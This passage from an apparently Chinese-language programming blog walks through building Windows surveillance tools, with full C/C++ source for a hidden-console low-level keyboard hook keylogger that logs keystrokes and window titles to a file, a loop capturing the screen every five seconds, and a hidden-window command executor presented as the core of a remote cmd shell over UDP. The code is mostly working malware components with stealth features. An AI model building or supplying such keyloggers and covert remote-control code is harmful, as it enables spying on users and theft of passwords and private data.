class="string">&quot;\&quot;\&quot;or\&#x27;\&#x27;&quot;</span>),</span><br><span class="line"></span><br><span class="line">		AddVKey(VK_OEM_8, <span class="string">&quot;Used for miscellaneous characters; it can vary by keyboard.&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xE0</span>, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xE1</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_102, <span class="string">&quot;Windows 2000/XP: Either the angle bracket key or the backslash key on the RT 102-key keyboard&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xE3</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xE4</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(VK_PROCESSKEY, <span class="string">&quot;Windows 95/98/Me, Windows NT 4.0, Windows 2000/XP: IME PROCESS key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xE6</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xE7</span>, <span class="string">&quot;Windows 2000/XP: Used to pass Unicode characters as if they were keystrokes. The VK_PACKET key is the low word of a 32-bit Virtual Key value used for non-keyboard input methods. For more information, see Remark in KEYBDINPUT, SendInput, WM_KEYDOWN, and WM_KEYUP&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xE8</span>, <span class="string">&quot;Unassigned&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xE9</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xEA</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xEB</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xEC</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xED</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xEF</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xF0</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xF1</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xF2</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xF3</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xF4</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xF5</span>, <span class="string">&quot;OEM specific&quot;</span>),</span><br><span class="line">		AddVKey(VK_ATTN, <span class="string">&quot;Attn key&quot;</span>),</span><br><span class="line">		AddVKey(VK_CRSEL, <span class="string">&quot;CrSel key&quot;</span>),</span><br><span class="line">		AddVKey(VK_EXSEL, <span class="string">&quot;ExSel key&quot;</span>),</span><br><span class="line">		AddVKey(VK_EREOF, <span class="string">&quot;Erase EOF key&quot;</span>),</span><br><span class="line">		AddVKey(VK_PLAY, <span class="string">&quot;Play key&quot;</span>),</span><br><span class="line">		AddVKey(VK_ZOOM, <span class="string">&quot;Zoom key&quot;</span>),</span><br><span class="line">		AddVKey(VK_NONAME, <span class="string">&quot;Reserved&quot;</span>),</span><br><span class="line">		AddVKey(VK_PA1, <span class="string">&quot;PA1 key&quot;</span>),</span><br><span class="line">		AddVKey(VK_OEM_CLEAR, <span class="string">&quot;Clear key&quot;</span>),</span><br><span class="line">		AddVKey(<span class="number">0xFF</span>, <span class="string">&quot;Unknown Virtual-Key Code&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">LPCSTR <span class="title">GetKeyName</span><span class="params">(USHORT VKey)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(vkis); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (VKey == vkis[i].VKey)</span><br><span class="line">			<span class="keyword">return</span> vkis[i].VKname;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> vkis[--i].VKname;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Sava_Keyboard</span><span class="params">(LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KBDLLHOOKSTRUCT sKB;</span><br><span class="line">	sKB = (KBDLLHOOKSTRUCT)(*(KBDLLHOOKSTRUCT*)lParam);</span><br><span class="line">	HWND hForegroundWindows;</span><br><span class="line">	<span class="keyword">char</span> cKeyname[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">char</span> cTitle2[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">char</span> cText[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	FILE* fp=<span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	fopen_s(&amp;fp, <span class="string">&quot;log.txt&quot;</span>, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (fp == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fopen_s Failed!!!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	hForegroundWindows=GetForegroundWindow();</span><br><span class="line">	GetWindowTextA(hForegroundWindows, cTitle2, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">strcmp</span>(cTitle1, cTitle2))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">sprintf</span>(cText, <span class="string">&quot;\n[Windows - %s]\t\n&quot;</span>, cTitle2);</span><br><span class="line">		fwrite(cText, <span class="built_in">strlen</span>(cText) + <span class="number">1</span>, <span class="number">1</span>, fp);</span><br><span class="line">		<span class="built_in">memset</span>(cTitle1, <span class="number">0</span>, MAX_PATH);</span><br><span class="line">		<span class="built_in">strcpy</span>(cTitle1, cTitle2);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(cText, <span class="number">0</span>,MAX_PATH);</span><br><span class="line">	<span class="built_in">strcpy</span>(cKeyname, GetKeyName(sKB.vkCode));</span><br><span class="line">	<span class="built_in">sprintf</span>(cText, <span class="string">&quot;%s&quot;</span>, cKeyname);</span><br><span class="line">	fwrite(cText, <span class="built_in">strlen</span>(cText), <span class="number">1</span>, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">LowLevelKeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)</span><br><span class="line">	&#123;</span><br><span class="line">		Sava_Keyboard(lParam);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(<span class="literal">NULL</span>, nCode, wParam, lParam);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HHOOK hhk;</span><br><span class="line">	HWND hWnd;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//隐藏窗口</span></span><br><span class="line">	AllocConsole();</span><br><span class="line">	hWnd = FindWindowA(<span class="string">&quot;ConsoleWindowClass&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (hWnd)</span><br><span class="line">		ShowWindow(hWnd, <span class="number">0</span>);</span><br><span class="line">	<span class="comment">//设置键盘记录HOOK</span></span><br><span class="line">	hhk=SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, GetModuleHandle(<span class="number">0</span>), <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">while</span> (GetMessage(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>));</span><br><span class="line">	<span class="keyword">return</span> UnhookWindowsHookEx(hhk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意点就是ctitle1需要设置为全局变量，不能在函数中被重置。</p>
<h3 id="桌面截屏"><a href="#桌面截屏" class="headerlink" title="桌面截屏"></a>桌面截屏</h3><p>网上找到一段对DC的解释还比较通俗易懂的说法。</p>
<p>首先明白DC的含义，Windows不允许程序员直接访问硬件，它对屏幕的操作是通过环境设备,也就是DC来完成的。屏幕上的没一个窗口都对应一个DC,可以把DC想象成一个视频缓冲区，对这这个缓冲区的操作，会表现在这个缓冲区对应的屏幕窗口上。<br>在窗口的DC之外，可以建立自己的DC，就是说它不对应窗口，这个方法就是CreateCompatibleDC，这个DC就是一个内存缓冲区，通过这个DC你可以把和它兼容的窗口DC保存到这个DC中，就是说你可以通过它在不同的DC之间拷贝数据。例如：你先在这个DC中建立好数据，然后在拷贝到窗口的DC就是完成了这个窗口的刷新。</p>
<p>用通俗易懂的方式来讲讲过程。</p>
<ul>
<li>简单讲上下文DC理解为一块画布，然后可以根据窗口的句柄来获取窗口的DC，也就是GetDC()这个函数，并且相当于是有画了的画布。</li>
<li>但是我们为了复制这个画布的画，我们自己也要有一个画布，所以要创建兼容性DC，也就是CreateCompatibleDC()这个函数。</li>
<li>当然，画布肯定是需要规定大小之类的，所有有CreateCompatibleBitmap()函数，创建位图，位图又叫做点阵图，是一个个很小的颜色小方块组合在一起的图片。CreateCompatibleDC()函数也说了，在对DC(画布)绘画前，它必须将正确宽度和高度的位图选择到 DC 中。</li>
<li>然后如何传递位图给DC呢，就是用到SelectObject()函数。</li>
<li>之后就可以利用BitBlt原设备的上下文(画)复制到目标设备(我们的画布)。</li>
</ul>
<p>上面的部分就是复制的部分，下面来讲如何绘制鼠标的原理。</p>
<ul>
<li>实际上差不多，</li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;atlimage.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ScreenWidth;</span><br><span class="line"><span class="keyword">int</span> ScreenHeight;</span><br><span class="line"><span class="function">BOOL <span class="title">GetNewTime</span><span class="params">(<span class="keyword">char</span> *sTime)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">time_t</span> timep;</span><br><span class="line">	time(&amp;timep);</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tm</span>* <span class="title">p</span>;</span></span><br><span class="line">	p = gmtime(&amp;timep);</span><br><span class="line">	<span class="built_in">sprintf</span>(sTime, <span class="string">&quot;%d-%d-%d %d %d %d&quot;</span>, <span class="number">1900</span> + p-&gt;tm_year, <span class="number">1</span> + p-&gt;tm_mon, p-&gt;tm_mday, <span class="number">8</span> + p-&gt;tm_hour, p-&gt;tm_min, p-&gt;tm_sec);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Save_to_jpg</span><span class="params">(HBITMAP hbmp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CImage image;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">memset</span>(buffer, <span class="number">0</span>, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line">	GetNewTime(buffer);</span><br><span class="line">	<span class="built_in">strcat</span>(buffer, <span class="string">&quot;.jpg&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buffer);</span><br><span class="line">	image.Attach(hbmp);</span><br><span class="line">	image.Save(buffer);</span><br><span class="line">	Sleep(<span class="number">2000</span>);</span><br><span class="line">	remove(buffer);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function">BOOL <span class="title">PaintMouse</span><span class="params">(HDC hdc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HDC bufdc = <span class="literal">NULL</span>;</span><br><span class="line">	CURSORINFO cursorInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	ICONINFO iconInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	HBITMAP bmpOldMask = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	bufdc = ::CreateCompatibleDC(hdc);</span><br><span class="line">	::RtlZeroMemory(&amp;iconInfo, <span class="keyword">sizeof</span>(iconInfo));</span><br><span class="line">	cursorInfo.cbSize = <span class="keyword">sizeof</span>(cursorInfo);</span><br><span class="line">	<span class="comment">// 获取光标信息</span></span><br><span class="line">	::GetCursorInfo(&amp;cursorInfo);</span><br><span class="line">	<span class="comment">// 获取光标图标信息</span></span><br><span class="line">	::GetIconInfo(cursorInfo.hCursor, &amp;iconInfo);</span><br><span class="line">	<span class="comment">// 绘制 白底黑鼠标(AND)</span></span><br><span class="line">	bmpOldMask = (HBITMAP)::SelectObject(bufdc, iconInfo.hbmMask);</span><br><span class="line">	::BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, <span class="number">20</span>, <span class="number">20</span>,</span><br><span class="line">		bufdc, <span class="number">0</span>, <span class="number">0</span>, SRCAND);</span><br><span class="line">	<span class="comment">//绘制 黑底彩色鼠标(OR)</span></span><br><span class="line">	SelectObject(bufdc, iconInfo.hbmColor);</span><br><span class="line">	BitBlt(hdc, cursorInfo.ptScreenPos.x, cursorInfo.ptScreenPos.y, <span class="number">20</span>, <span class="number">20</span>,</span><br><span class="line">		bufdc, <span class="number">0</span>, <span class="number">0</span>, SRCPAINT);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 释放资源</span></span><br><span class="line">	SelectObject(bufdc, bmpOldMask);</span><br><span class="line">	DeleteObject(iconInfo.hbmColor);</span><br><span class="line">	DeleteObject(iconInfo.hbmMask);</span><br><span class="line">	DeleteDC(bufdc);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">ScreenCapture</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HWND hDesktopWnd;</span><br><span class="line">	HDC hDc;</span><br><span class="line">	HDC mDc;</span><br><span class="line">	HBITMAP bmp;</span><br><span class="line">	HGDIOBJ hobj;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取桌面窗口句柄</span></span><br><span class="line">	hDesktopWnd=GetDesktopWindow();</span><br><span class="line">	<span class="comment">//获取窗口DC</span></span><br><span class="line">	hDc = GetDC(hDesktopWnd);</span><br><span class="line">	<span class="comment">//创建兼容性DC</span></span><br><span class="line">	mDc = CreateCompatibleDC(hDc);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取屏幕长宽</span></span><br><span class="line">	ScreenWidth = GetSystemMetrics(SM_CXSCREEN);</span><br><span class="line">	ScreenHeight = GetSystemMetrics(SM_CYSCREEN);</span><br><span class="line">	<span class="comment">//创建兼容位图</span></span><br><span class="line">	bmp = CreateCompatibleBitmap(hDc, ScreenWidth, ScreenHeight);</span><br><span class="line">	<span class="comment">//选中位图</span></span><br><span class="line">	hobj=SelectObject(mDc, bmp);</span><br><span class="line"></span><br><span class="line">	BitBlt(mDc, <span class="number">0</span>, <span class="number">0</span>, ScreenWidth, ScreenHeight, hDc, <span class="number">0</span>, <span class="number">0</span>, SRCCOPY);</span><br><span class="line">	PaintMouse(mDc);</span><br><span class="line">	Save_to_jpg(bmp);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//网上找到的比较简单的，实际上差不多意思。</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ScreenShot</span><span class="params">(LPCTSTR s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HDC hdcSrc = GetDC(GetDesktopWindow());</span><br><span class="line">	<span class="keyword">int</span> nBitPerPixel = GetDeviceCaps(hdcSrc, BITSPIXEL);</span><br><span class="line">	<span class="keyword">int</span> nWidth = GetDeviceCaps(hdcSrc, HORZRES);</span><br><span class="line">	<span class="keyword">int</span> nHeight = GetDeviceCaps(hdcSrc, VERTRES);</span><br><span class="line">	CImage image;</span><br><span class="line">	image.Create(nWidth, nHeight, nBitPerPixel);</span><br><span class="line">	BitBlt(image.GetDC(), <span class="number">0</span>, <span class="number">0</span>, nWidth, nHeight, hdcSrc, <span class="number">0</span>, <span class="number">0</span>, SRCCOPY);</span><br><span class="line">	ReleaseDC(<span class="literal">NULL</span>, hdcSrc);</span><br><span class="line">	image.ReleaseDC();</span><br><span class="line">	image.Save(s, Gdiplus::ImageFormatPNG);<span class="comment">//ImageFormatJPEG</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">while</span> (TRUE)</span><br><span class="line">	&#123;</span><br><span class="line">		ScreenCapture();</span><br><span class="line">		Sleep(<span class="number">5000</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//ScreenShot(&quot;hello.jpg&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面就实现了不断截图和删除截图的操作了，注意字符集使用多字节字符集。</p>
<h2 id="远程cmd"><a href="#远程cmd" class="headerlink" title="远程cmd"></a>远程cmd</h2><p>我们知道通过一些函数比如说system，WinExec，CreateProcess，等是可以执行cmd命令的，但是有时候我们需要获取返回来的数据，也就执行完cmd命令，下方出现的数据，就可以利用到网络通信和管道的知识。</p>
<p>管道，用来进行进程间通信数据的，本质是一段内存共享。两个进程利用管道文件进行通信时，一个进程为写进程，另一个进程为读进程。写进程通过写端（发送端）往管道文件中写入信息；读进程通过读端（接收端）从管道文件中读取信息。</p>
<p>管道分为匿名管道和命名管道。</p>
<ul>
<li>匿名管道:管道是半双工的，数据只能单向通信；需要双方通信时，需要建立起两个管道；只能用于父子进程或者兄弟进程之间（具有亲缘关系的进程）。</li>
<li>命名管道：可在同一台计算机的不同进程之间或在跨越一个网络的不同计算机的不同进程之间，支持可靠的、单向或双向的数据通信。</li>
</ul>
<p>这里是用匿名管道实现的cmd返回数据通信，也就是CreatePipe函数，如果是命名管道则是CreateNamedPipe函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">MyRemoteCmd</span><span class="params">(<span class="keyword">char</span>* lpCommandLine, <span class="keyword">char</span>* buffer, DWORD buffersize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE  hReadPipe=<span class="literal">NULL</span>;</span><br><span class="line">	HANDLE  hWritePipe=<span class="literal">NULL</span>;</span><br><span class="line">	SECURITY_ATTRIBUTES securityattributes = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	STARTUPINFOA si = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	PROCESS_INFORMATION pi = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置SECURITY_ATTRIBUTES结构体属性。</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//大小</span></span><br><span class="line">	securityattributes.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);</span><br><span class="line">	<span class="comment">//可被创建的新进程继承句柄。</span></span><br><span class="line">	securityattributes.bInheritHandle = TRUE;</span><br><span class="line">	securityattributes.lpSecurityDescriptor = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (CreatePipe(&amp;hReadPipe, &amp;hWritePipe, &amp;securityattributes, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreatePipe Failed!!! %d&quot;</span>, GetLastError());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">	ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">	si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line">	<span class="comment">//隐藏窗口</span></span><br><span class="line">	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;<span class="comment">//STARTF_USESTDHANDLES这个代表指定是进程的标准输入输出句柄</span></span><br><span class="line">	si.wShowWindow = SW_HIDE;</span><br><span class="line">	<span class="comment">//设置输出句柄和标准错误句柄</span></span><br><span class="line">	si.hStdOutput = hWritePipe;</span><br><span class="line">	si.hStdError = hWritePipe;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置为继承句柄，将返回数据写入管道</span></span><br><span class="line">	CreateProcessA(<span class="number">0</span>, lpCommandLine, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">	<span class="comment">//等待子进程结束</span></span><br><span class="line">	WaitForSingleObject(pi.hProcess, INFINITE);</span><br><span class="line">	WaitForSingleObject(pi.hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用ReadFile读取管道数据，CreatePipe函数的评论也讲到利用ReadFile来读取数据</span></span><br><span class="line">	ReadFile(hReadPipe, buffer, buffersize, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//关闭句柄 </span></span><br><span class="line">	CloseHandle(pi.hProcess);</span><br><span class="line">	CloseHandle(pi.hThread);</span><br><span class="line">	CloseHandle(hWritePipe);</span><br><span class="line">	CloseHandle(hReadPipe);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> cmd[] = <span class="string">&quot;ipconfig&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> szBuffer[<span class="number">0x10000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	DWORD dwBufferSize = <span class="number">0x10000</span>;</span><br><span class="line">	<span class="built_in">memset</span>(szBuffer, <span class="number">0</span>, dwBufferSize);</span><br><span class="line">	MyRemoteCmd(cmd, szBuffer, dwBufferSize);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, szBuffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面就实现了用管道读取cmd命令ipconfig执行完成后返回的数据。当然还没有实现远程，当然实现远程也很简单，利用socket通讯，TCP或者UDP都行，接收到cmd命令的一方，直接进行管道通信，然后得到返回的数据，然后在发送出去。</p>
<p>代码入下，基于UDP协议，UDP通信感觉还是有点麻烦，和TCP各有优点吧。</p>
<p>按道理也应该分个命令发送端和命令执行端的，但是太麻烦了，我就没有分开写，但是给命令执行端分配了个发送命令执行完成后信息的端口2333，也就是命令发送端的端口。这样命令执行端如果想向命令发送端发送cmd命令是做不到的。</p>
